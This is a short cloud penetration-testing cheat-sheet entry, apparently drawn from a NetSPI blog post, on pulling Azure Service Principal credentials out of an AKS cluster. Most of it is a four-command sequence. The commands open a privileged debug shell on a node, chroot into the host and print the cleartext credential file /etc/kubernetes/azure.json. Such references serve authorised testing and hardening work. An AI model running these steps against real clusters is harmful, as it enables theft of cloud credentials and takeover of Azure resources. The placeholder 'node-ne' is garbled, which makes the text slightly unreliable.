### Gather Service Principal Credentials from AKS Cluster

Azure places the Service Principal credentials in cleartext into the `/etc/kubernetes/azure.json` file on the cluster.

Source: [Extract Credentials from Azure Kubernetes Service](https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/)

#### List Nodes in the Cluster
```shell
kubectl get nodes
```

#### Open a Shell Session on a Node
```shell
kubectl debug node/<node-ne> --image=mcr.microsoft.com/dotnet/runtime-deps:6.0
```

#### Access the VMSS Instance
```shell
chroot /host
```

#### Retrieve and Display the `azure.json` File
```shell
cat /etc/kubernetes/azure.json
```

**Note**: Replace `<node-ne>` with the actual ne of the node you are targeting.